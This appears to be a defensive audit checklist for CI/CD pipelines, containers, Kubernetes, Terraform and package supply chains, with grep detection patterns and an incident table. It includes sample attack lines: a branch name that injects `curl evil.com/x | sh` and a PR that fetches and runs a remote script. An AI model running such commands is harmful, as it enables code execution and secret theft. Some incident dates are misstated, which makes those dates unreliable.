# CI/CD, containers, supply chain — OWASP 2025 A03

OWASP promoted **Software Supply Chain Failures** to Top 3 in 2025 specifically because of 2023-2025 incidents: XZ backdoor, tj-actions/changed-files compromise (Mar 2025), ctx / `ua-parser-js` / `colors.js` / `event-stream` / dozens of npm/pypi typosquats. Read this file whenever the repo has `.github/workflows/`, `Dockerfile`, `docker-compose.*`, `terraform/`, `helm/`, `k8s/`, `*.tf`, or a deploy script.

---

## 1. GitHub Actions — the 2025 blast zone

### `pull_request_target` + checkout of PR code = remote code execution in CI

The single most dangerous GH Actions pattern:

```yaml
on: pull_request_target      # runs with write tokens + secrets
jobs:
  ci:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm test                                       # executes attacker code
```

`pull_request_target` runs in the context of the base branch with access to secrets and a write token — but the above explicitly checks out the PR's code, then runs scripts from it. Attacker opens a PR that edits `package.json`'s `test` script → RCE in CI, secrets exfiltrated, write to main via `GITHUB_TOKEN`.

**CRITICAL** every time. Grep:
```
on:.*pull_request_target
pull_request_target
```
…and for each match, read the workflow: does it check out PR code?

**Fix to verify:** either use `pull_request` (no secrets, no write), or `pull_request_target` without PR checkout and without running PR-controlled scripts, or gate on `if: github.event.pull_request.head.repo.full_name == github.repository` (i.e., only same-repo PRs from collaborators).

### Unpinned third-party actions — the tj-actions lesson

March 2025: `tj-actions/changed-files` was compromised. The maintainer's release tags were moved to a malicious commit that dumped secrets from every CI job that pulled `@v35` / `@latest`. Tens of thousands of repos affected.

**Rule:** every third-party action pinned by **commit SHA**, not by tag.
```yaml
# BAD — tag is mutable
- uses: tj-actions/changed-files@v35
# GOOD — SHA is immutable
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8
```

Grep:
```
uses:\s+[^@]+@v\d
uses:\s+[^@]+@main
uses:\s+[^@]+@master
```

Any third-party action (not `actions/*` owned by GitHub) pinned by tag or branch = HIGH. Verify the repo has a `dependabot.yml` or renovate config that updates the SHAs automatically.

### Script injection via workflow expressions

```yaml
- run: echo "Branch: ${{ github.head_ref }}"   # head_ref is attacker-controlled in forks
```

If an attacker names their branch `"; curl evil.com/x | sh; #`, that shell runs. **CRITICAL**.

Dangerous expression contexts:
- `github.head_ref`, `github.event.pull_request.title`, `github.event.pull_request.body`
- `github.event.issue.title`, `github.event.comment.body`
- `github.event.pusher.name`, `github.event.pusher.email`
- Any field populated from user-submitted data.

**Fix:** pass via env, never string-interpolate into shell:
```yaml
- run: echo "Branch: $BRANCH"
  env:
    BRANCH: ${{ github.head_ref }}
```

Grep:
```
\$\{\{\s*github\.event\.pull_request
\$\{\{\s*github\.head_ref
\$\{\{\s*github\.event\.issue
\$\{\{\s*github\.event\.comment
```

### `GITHUB_TOKEN` permissions

Workflows default to **write** permissions on a lot of scopes unless `permissions:` is declared at top. Verify:
```yaml
permissions:
  contents: read
```
at the workflow top, narrowed per-job where writes are needed. Absent = MEDIUM (many orgs have tightened the default; check repo settings).

### Self-hosted runners on public repos

Self-hosted runners persist state between jobs. An attacker's PR can run `curl evil.com/impl.sh | sh` and install a backdoor that stays for subsequent jobs — stealing secrets from other unrelated workflows. CRITICAL unless the runner is ephemeral (new VM per job) AND the repo requires approval for PR workflows from first-time contributors.

### `workflow_dispatch` + arbitrary inputs

Manual workflows with `inputs` that are used in shell / deploy steps can be abused by anyone with write access — which is often more people than you think. Verify inputs are typed (`type: choice`) and not user-free-form strings going into shell.

### OIDC + AWS / GCP / Azure

If workflows assume cloud roles via OIDC (`aws-actions/configure-aws-credentials` with `role-to-assume`):
- The IAM trust policy should pin the `sub` to specific branch(es) or environment(s), not `repo:myorg/myrepo:*`.
- A wildcard `sub` lets any PR (including forks via `pull_request_target`) assume the role.

---

## 2. npm / pnpm / yarn supply chain

### Typosquatting & dependency confusion

When auditing `package.json`, eyeball each dependency:
- **Typosquats:** `expresss` (3 s's), `node-fetch-npm`, `reqquest`, `cross-env.js` vs `cross-env`. Check against the legit package on npm.
- **Dependency confusion:** an internal package name (e.g. `@yourco/shared-utils`) that ALSO exists on public npm. If the project isn't scoped to a private registry for the `@yourco/*` scope, public npm wins → attacker uploads a malicious version.

Check `.npmrc` / `.yarnrc.yml` for:
```
@yourco:registry=https://npm.internal.yourco.com
```
Without it on an internal scope = CRITICAL.

### Pre / post-install scripts

`npm install` runs `preinstall`, `install`, `postinstall`, `prepare` scripts from EVERY package in the dep tree. One compromised dep = RCE on every developer + CI machine.

Defences to look for:
- `.npmrc` with `ignore-scripts=true` (plus explicit opt-in for known-safe deps).
- pnpm: `onlyBuiltDependencies: [...]` allowlist.
- Corepack / controlled install in CI.

Absent on a 50+ dep project = MEDIUM (informational if no specific bad dep identified).

### Lockfile integrity

- `package-lock.json` / `pnpm-lock.yaml` / `yarn.lock` committed.
- CI uses `npm ci` / `pnpm install --frozen-lockfile` / `yarn install --immutable` — not `npm install` (which can update the lockfile silently).
- `npm audit signatures` / `pnpm audit` to check package provenance / sigstore signatures (2024+).

Missing lockfile on an app repo = MEDIUM. Missing `--frozen-lockfile` in CI = MEDIUM (supply-chain drift risk).

### Postinstall binary downloads

Some packages download binaries in postinstall (`node-gyp`, `puppeteer`, `@napi-rs/*` with fallback fetches, older `sharp`). Binaries from a compromised host = RCE. Not usually actionable but flag if the project uses `--unsafe-perm` or roots CI through such a dep.

---

## 3. Python supply chain

- `pip install` runs `setup.py` — arbitrary code execution at install time. Same class as npm postinstall.
- Prefer `pip install --require-hashes -r requirements.txt` with hashes; generate via `pip-compile --generate-hashes`.
- Poetry `poetry.lock` committed; CI uses `poetry install --sync` / `poetry install --no-root`.
- **PyPI typosquats** — `urllib3` vs `urlib3`, `python-nmap` vs `pynmap`, etc. Recent waves of crypto-stealer packages via typosquats (2023-2025).
- **Namespace confusion** — internal `<your-company>-utils` on PyPI same pattern as npm §2.

---

## 4. Dockerfile — the classic RCE surface

For every Dockerfile:

### Secrets in build args or layers

```dockerfile
ARG NPM_TOKEN
RUN npm install   # if NPM_TOKEN lands in .npmrc in a COPY layer, it's in the image
```

Secrets in build args end up in `docker history <image>`. Any ARG named `*TOKEN`, `*SECRET`, `*PASSWORD`, `*KEY` = CRITICAL unless used via BuildKit's `--mount=type=secret` (which does NOT persist in layers):

```dockerfile
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) npm install
```

Grep:
```
ARG.*(TOKEN|SECRET|PASSWORD|KEY)
ENV.*(TOKEN|SECRET|PASSWORD|KEY)
```

### Running as root

```dockerfile
# Implicit root
FROM node:20-alpine
COPY . .
CMD ["node", "server.js"]   # runs as UID 0
```

In prod containers, missing `USER <non-root>` = MEDIUM. CRITICAL if the container also mounts `docker.sock` or has `CAP_SYS_ADMIN`.

### Unpinned base image

`FROM node:20` vs `FROM node:20.11.1-alpine3.19@sha256:<digest>`. Tag-based pin can move under your feet. SHA-pin base images in prod Dockerfiles. MEDIUM if tag-pinned, LOW if minor-version-pinned.

### `latest` tag in prod

CRITICAL when used for production images — builds become non-reproducible and can silently introduce vulnerabilities.

### Copying secrets via `COPY .`

`COPY . /app/` — if `.dockerignore` doesn't exclude `.env`, `.git`, `*.key`, `node_modules` with cached credentials, those land in the image.

Check `.dockerignore` excludes:
- `.env*`
- `.git` / `.github`
- `*.pem`, `*.key`, `*.crt`
- `node_modules` (if building inside image)

### Exposed daemon socket

Mounting `-v /var/run/docker.sock:/var/run/docker.sock` into an app container = container breakout to host. CRITICAL unless this is specifically a CI runner / harbor tool and isolated.

### `--privileged` / capabilities

`docker run --privileged` or `securityContext.privileged: true` in K8s = full host root from inside container. CRITICAL in production workloads unless specifically a node-level tool.

---

## 5. Kubernetes / Helm

For every Deployment / StatefulSet / DaemonSet:

- **`runAsNonRoot: true`** and `runAsUser: <non-zero>`. Missing = MEDIUM.
- **`readOnlyRootFilesystem: true`** where possible. Limits attacker write surface post-breakout.
- **`allowPrivilegeEscalation: false`** in `securityContext`.
- **`capabilities: { drop: ["ALL"] }`** with explicit `add` only where needed.
- **No `hostNetwork: true`** unless specifically needed (e.g. ingress controllers).
- **No `hostPID: true` / `hostIPC: true`**.
- **No `hostPath` volumes** outside specific infra workloads. CRITICAL if a workload mounts `/` or `/var/run/docker.sock`.
- **NetworkPolicies present.** Default K8s = all pods can reach all pods. At minimum a deny-by-default policy + per-app allowlists.
- **RBAC**: ServiceAccounts per workload (not `default`), Role/RoleBindings narrowed to what the workload actually does. `cluster-admin` binding on an app workload = CRITICAL.
- **Secrets as env vars vs mounted files** — mounted is slightly better (not in `ps`/`/proc/<pid>/environ` as visible), but either way: don't check them into the repo. Sealed Secrets / External Secrets Operator / SOPS for GitOps.
- **Pod Security Admission** — namespace labels enforce `baseline` or `restricted`. Missing + privileged-possible workloads = HIGH.

Grep:
```
privileged:\s*true
hostNetwork:\s*true
hostPID:\s*true
hostPath:
runAsUser:\s*0
allowPrivilegeEscalation:\s*true
```

---

## 6. Terraform / IaC

- **Secrets in state.** Terraform state can contain secret values (RDS passwords, API tokens). State stored in S3 without encryption / without strict bucket policy = HIGH. State committed to git = CRITICAL.
- **Public S3 buckets / Azure Blob containers / GCS.** `acl = "public-read"`, `block_public_access = false`, `public_access_prevention = "inherited"` → data exposure. CRITICAL if the bucket holds user data; MEDIUM if known-public assets.
- **Open security groups.** `0.0.0.0/0` on port 22 (SSH), 3306 (MySQL), 5432 (Postgres), 6379 (Redis), 27017 (Mongo). CRITICAL. Port 80/443 is fine.
- **IMDSv1 on EC2.** `metadata_options { http_tokens = "optional" }` (or absent) = IMDSv1 enabled → SSRF steals IAM creds. Set `http_tokens = "required"`. HIGH.
- **Overly broad IAM.** `"Action": "*"` / `"Resource": "*"` on production roles = MEDIUM at minimum, HIGH if a compute workload. Use least privilege.
- **Public EKS / GKE / AKS control planes** without allowlist. HIGH unless explicitly intentional.
- **RDS / CloudSQL without encryption at rest.** `storage_encrypted = true`. Missing = MEDIUM for PII workloads.
- **RDS snapshots / S3 backups public.** Common accidental exposure. Check policies.
- **CloudTrail / audit logging.** Absent in prod = HIGH for a compliance / forensics posture; MEDIUM strict-security.
- **KMS key rotation.** `enable_key_rotation = true` on long-lived keys.
- **Secrets Manager vs plain SSM parameter vs env.** Env vars in Terraform that end up as plain ECS/Lambda env = MEDIUM (readable by anyone with describe rights); Secrets Manager reference = good.

---

## 7. Cloud specifics worth flagging

### AWS

- **IAM user access keys** in repo / Terraform outputs. Short-lived role assumption via OIDC preferred.
- **S3 bucket** with `BlockPublicAcls: false` AND any public object policy.
- **Lambda with overly broad `Resource: "*"`**.
- **SNS / SQS with Principal `"*"`** in policies.
- **RDS / ElastiCache with public accessibility**.
- **Cognito user pool without MFA** for high-value apps.

### GCP

- **Service account keys** (`.json` files). Workload Identity Federation preferred.
- **GCE metadata endpoint** — `curl metadata.google.internal/computeMetadata/v1/` — SSRF target; ensure VPC and workload identity are configured.
- **Cloud Run public invoker** (`allUsers`) on a service meant to be internal.

### Cloudflare / edge

- **Workers with `*` route** + auth outside the worker (trust boundary confusion).
- **R2 buckets public** without intent.
- **Page Rules / Transform Rules** that strip security headers upstream.

---

## 8. Subdomain takeover

Covered briefly in `stack-api-surface.md §22`. For IaC: any CNAME / ALIAS in Terraform / `*.tf` / Route53 / Cloudflare DNS pointing to a third-party service (GitHub Pages, Netlify, Heroku, Fastly, S3 website endpoint, Shopify). If the backend is later removed but DNS stays, takeover is possible.

Flag for user verification rather than claiming as a confirmed finding.

---

## 9. Dependabot / Renovate presence

Not strictly security per se, but: a repo with 300 deps and no `dependabot.yml` / `renovate.json` is going to drift into CVE territory within months. MEDIUM "hygiene" note; don't list as CRITICAL.

---

## 10. Environment promotion & secret scoping

- **Prod secrets accessible from feature-branch deploys.** Preview deploys on Vercel / Netlify / Cloudflare Pages with production env vars = an attacker opens a PR with a telemetry-style leak and exfiltrates prod creds. HIGH if confirmed.
- **Same secret across environments.** Single `DATABASE_URL` shared between dev/staging/prod = blast radius maximisation.
- **Secrets in client-side env.** `NEXT_PUBLIC_*` / `VITE_*` — covered in `stack-react.md §6`.

---

## 11. CI/CD quick checklist

1. Every workflow: what does `on:` trigger? Any `pull_request_target`? If yes, read every step.
2. Every `uses:` line — is it pinned by SHA or tag? Third-party + tag = HIGH.
3. Every `run:` line — does it interpolate `${{ github.event.* }}` into shell? That's script-injection.
4. `permissions:` declared at top of each workflow?
5. Self-hosted runners on public repos? If yes, ephemeral?
6. OIDC federation IAM trust policy has specific `sub` pin?
7. `.npmrc` has `ignore-scripts=true` or a scoped registry for internal deps?
8. Lockfile committed + CI uses frozen/immutable install?
9. Dockerfile: non-root USER, no secrets in ARG/COPY, SHA-pinned base, .dockerignore covers sensitive files?
10. K8s: runAsNonRoot, no privileged, no hostPath, no cluster-admin RoleBinding on app workloads?
11. Terraform: no open security groups for DB ports, IMDSv2 required, state encrypted, no `*` IAM?
12. Preview/staging envs don't have prod secrets?

---

## Notable 2024-2025 supply chain incidents to know

Mention these when users push back on supply-chain severity.

| Year | Incident | Vector | Lesson |
|------|----------|--------|--------|
| 2024 | XZ Utils backdoor (CVE-2024-3094) | Maintainer social-engineered, malicious tarball | Build-artifact != source; reproducible builds matter |
| 2024 | `ua-parser-js` / `rc` / `coa` compromises | npm account takeover | 2FA on npm maintainer accounts; pin by SHA |
| 2025-Mar | `tj-actions/changed-files` | GH Actions release tags moved to malicious commit | Pin actions by SHA, never tag |
| 2024 | `lottie-player` npm compromise | Maintainer token leak | Scope access tokens, use provenance/sigstore |
| 2024-2025 | PyPI crypto-drainer typosquats (multiple) | Typosquat installation | Require-hashes; use scoped internal indexes |
| 2025 | Multiple CrowdStrike / SolarWinds-style signed-update incidents | Signed build pipeline compromise | Defence in depth; treat updates as code review events |

When flagging supply-chain findings, cite one of these as "this is the class of incident we saw in [year]" — makes the severity concrete.
